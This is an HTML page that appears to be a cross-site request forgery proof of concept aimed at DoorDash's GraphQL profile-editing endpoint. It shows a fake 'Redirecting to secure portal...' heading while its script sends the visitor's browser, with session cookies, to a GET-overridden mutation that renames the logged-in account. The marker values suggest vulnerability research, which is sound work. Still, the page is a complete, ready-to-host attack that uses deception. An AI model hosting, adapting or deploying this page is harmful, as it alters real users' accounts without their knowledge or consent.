<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <h1>Redirecting to secure portal...</h1>
    <script>
        // We define the mutation parameters
        const operationName = "editConsumerProfileInformation";
        const variables = JSON.stringify({
            "firstName": "CSRF",
            "lastName": "Vulnerable"
        });
        const query = "mutation editConsumerProfileInformation($firstName: String, $lastName: String) { updateConsumerProfileInformation(firstName: $firstName, lastName: $lastName) { id firstName lastName } }";

        // Build the URL with all parameters included
        const finalUrl = "https://www.doordash.com/graphql/editConsumerProfileInformation" +
            "?_method=GET" +
            "&operationName=" + encodeURIComponent(operationName) +
            "&variables=" + encodeURIComponent(variables) +
            "&query=" + encodeURIComponent(query);

        // Perform a top-level navigation to ensure all cookies (authState, session) are sent
        window.location.href = finalUrl;
    </script>
</body>
</html>